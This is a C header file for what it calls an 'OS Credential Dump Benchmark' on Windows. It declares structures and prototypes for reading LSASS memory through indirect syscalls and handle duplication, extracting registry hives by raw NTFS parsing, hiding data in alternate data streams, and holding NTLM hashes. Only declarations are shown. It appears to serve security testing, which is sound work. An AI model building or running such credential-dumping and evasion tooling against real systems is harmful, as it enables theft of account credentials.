// common.h — Shared types & NT API definitions for OS Credential Dump Benchmark
#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <wincrypt.h>
#include <wincred.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// ─── Credential structures (shared across plans) ───
typedef struct { DWORD rid; WCHAR name[128]; BYTE ntlm[16]; BYTE lm[16]; } NTLM_CRED;

// winternl.h already provides: NTSTATUS, NT_SUCCESS, UNICODE_STRING, OBJECT_ATTRIBUTES, PCLIENT_ID, etc.

// Add missing NT status codes (not in all SDK versions)
#ifndef STATUS_PROCEDURE_NOT_FOUND
#define STATUS_PROCEDURE_NOT_FOUND ((NTSTATUS)0xC000007A)
#endif

// ─── Crypto declarations ───
void sha256(const BYTE* data, SIZE_T len, BYTE* hash);
void md5(const BYTE* data, SIZE_T len, BYTE* hash);
void rc4(const BYTE* key, SIZE_T keyLen, const BYTE* input, SIZE_T inputLen, BYTE* output);
void chacha20_encrypt(const BYTE* key, const BYTE* nonce, const BYTE* plaintext, SIZE_T len, BYTE* ciphertext);
void aes256_gcm_encrypt(const BYTE* key, const BYTE* nonce, const BYTE* plaintext, SIZE_T len, BYTE* ciphertext, BYTE* tag);
void aes256_gcm_decrypt(const BYTE* key, const BYTE* nonce, const BYTE* ciphertext, SIZE_T len, const BYTE* tag, BYTE* plaintext);
void pbkdf2_hmac_sha1(const BYTE* password, DWORD passLen, const BYTE* salt, DWORD saltLen, DWORD iterations, BYTE* output, DWORD outputLen);

// ─── NTFS structures (used by Plans 2, 4, 5) ───
#pragma pack(push, 1)
typedef struct { BYTE jump[3]; CHAR oemId[8]; USHORT bytesPerSector; BYTE sectorsPerCluster; USHORT reservedSectors; BYTE r1[3]; USHORT r2; BYTE media; USHORT r3; USHORT sectorsPerTrack; USHORT heads; ULONG hidden; ULONG r4; ULONGLONG totalSectors; ULONGLONG mftStartCluster; ULONGLONG mftMirrorStartCluster; BYTE clustersPerMftRecord; BYTE r5[3]; BYTE clustersPerIndexRecord; BYTE r6[3]; ULONGLONG volSerial; ULONG checksum; USHORT signature; } NTFS_BOOT_SECTOR;
typedef struct { DWORD bytesPerSector, sectorsPerCluster, clusterSize, mftRecordSize; DWORD64 mftStartCluster, totalClusters; } NTFS_CONTEXT;
typedef struct { CHAR signature[4]; USHORT sequenceOffset, fixupCount; ULONG64 lsn; USHORT sequenceNumber, linkCount, firstAttrOffset, flags; ULONG bytesInUse, bytesAllocated; ULONG64 baseRecord; USHORT nextAttrId; } MFT_FILE_RECORD;
#define ATTR_STANDARD_INFORMATION 0x10
#define ATTR_FILE_NAME 0x30
#define ATTR_DATA 0x80
#define ATTR_INDEX_ROOT 0x90
typedef struct { ULONG type, length; BYTE nonResident, nameLength; USHORT nameOffset, flags, attributeId; } ATTR_HEADER;
typedef struct { ATTR_HEADER header; ULONG64 startVcn, lastVcn; USHORT dataRunOffset, compressionUnit; ULONG r; ULONG64 allocatedSize, realSize, initializedSize; } ATTR_NONRESIDENT;
typedef struct { ATTR_HEADER header; ULONG valueLength; USHORT valueOffset; BYTE r; } ATTR_RESIDENT;
typedef struct { ULONG64 offset, length; } DATA_RUN;
typedef struct { ULONG64 parentDir, createTime, modTime, changeTime, accessTime, allocSize, realSize; ULONG flags, reparseTag; BYTE nameLength, nameType; WCHAR name[1]; } FILE_NAME_ATTR;
typedef struct { ULONG64 mftReference; USHORT entryLength, fileNameAttrLength, flags; } INDEX_ENTRY;
typedef struct { PBYTE data; SIZE_T size; } HIVE_DATA;
#pragma pack(pop)

__inline void FreeHiveData(HIVE_DATA* h) { if (h && h->data) { VirtualFree(h->data, 0, MEM_RELEASE); h->data = NULL; h->size = 0; } }
BOOL WriteToAds(PWSTR targetFile, PWSTR adsName, PBYTE data, SIZE_T size);

// ─── NTFS parsing (shared) ───
BOOL ParseNtfsBoot(HANDLE hVolume, NTFS_CONTEXT* ctx);
BOOL ReadMft(HANDLE hVolume, NTFS_CONTEXT* ctx, PBYTE* buf, PSIZE_T size);
PBYTE GetMftRecord(PBYTE mft, SIZE_T mftSize, DWORD64 recNo);
BOOL ExtractFileFromNtfs(HANDLE hVol, NTFS_CONTEXT* ctx, PBYTE mft, SIZE_T mftSize, PWSTR path, HIVE_DATA* hive);

// ─── Indirect syscalls (Plan 1) ───
typedef struct _SYSCALL_ENTRY { PWSTR name; DWORD syscallNumber; PVOID stubAddress; } SYSCALL_ENTRY;
BOOL InitSyscallResolver(void);
NTSTATUS SysNtOpenProcess(HANDLE* h, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, CLIENT_ID* cid);
NTSTATUS SysNtReadVirtualMemory(HANDLE h, PVOID base, PVOID buf, SIZE_T sz, PSIZE_T r);
NTSTATUS SysNtQueryVirtualMemory(HANDLE h, PVOID base, ULONG ic, PVOID mbi, SIZE_T sz, PSIZE_T r);
NTSTATUS SysNtQuerySystemInformation(ULONG ic, PVOID buf, ULONG sz, PULONG r);
NTSTATUS SysNtProtectVirtualMemory(HANDLE h, PVOID* base, PSIZE_T sz, ULONG prot, PULONG old);
DWORD FindLsassPid(void);
HANDLE OpenLsassViaHandleDup(DWORD pid);
